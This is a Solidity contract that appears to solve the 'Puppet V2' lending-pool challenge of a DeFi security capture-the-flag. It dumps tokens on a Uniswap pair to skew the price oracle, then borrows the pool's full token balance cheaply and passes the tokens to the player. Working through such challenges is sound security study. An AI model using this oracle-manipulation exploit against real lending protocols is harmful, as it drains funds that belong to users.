//SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "hardhat/console.sol";


interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}

interface IUniswapRouter {
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
}

interface IPool {
    function borrow(uint256 borrowAmount) external;
}

interface IWeth is IERC20 {
    function deposit() payable external;
}

contract AttackPuppetV2 {

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10000 ether; // actually dvt
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1000000 ether; // actually dvt

    IWeth private immutable wrappedEth;
    IERC20 private immutable token;
    address private immutable player;
    IUniswapRouter private immutable router;
    IPool private immutable pool;

    constructor(address _wethAddress, address _tokenAddress, address _router, address _player, address _pool) payable
    {
        wrappedEth = IWeth(_wethAddress);
        token = IERC20(_tokenAddress);
        router = IUniswapRouter(_router);
        player = _player;
        pool = IPool(_pool);
    }

    function swap() external {
        // TODO add console.log statements to show the progression
        console.log("1. attacker ETH balance: ", address(this).balance / 10 ** 18);
        token.approve(address(router), PLAYER_INITIAL_TOKEN_BALANCE);
        address[] memory pair = new address[](2);
        pair[0] = address(token);
        pair[1] = address(wrappedEth);
        router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 1, pair, address(this), block.timestamp + 5000);
        wrappedEth.deposit{value:295 * 10 ** 17}();
        wrappedEth.approve(address(pool), 295 * 10 ** 17);
        pool.borrow(1000000 ether);
        uint256 attackerBalance = token.balanceOf(address(this));
        token.transfer(player, attackerBalance);
    }

    receive() external payable {}
}
